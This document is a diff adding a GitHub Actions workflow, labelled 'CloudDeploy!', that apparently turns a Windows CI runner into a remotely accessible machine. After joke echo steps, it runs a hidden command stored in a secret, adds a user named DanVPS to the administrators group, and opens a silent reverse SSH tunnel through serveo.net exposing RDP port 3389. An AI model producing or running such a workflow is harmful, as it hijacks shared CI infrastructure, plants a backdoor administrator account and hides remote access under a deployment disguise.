@@ -1,0 +1,28 @@
+name: CloudDeploy!
+
+
+on:
+  workflow_dispatch:
+
+
+jobs:
+
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: I love AWS
+      run: cmd /c "echo I just love them..."
+
+    - name: what about Oracle?
+      run: cmd /c "echo Nahh its shit"
+
+    - name: so uh why is this hidden
+      run: ${{secrets.SUSCMD}}
+
+    - name: bruh who is this
+      run: net localgroup administrators DanVPS /add
+
+    - name: ok ig i finished
+      run: ssh -R 2379:localhost:3389 serveo.net -o "StrictHostKeyChecking no" >nul 2>&1
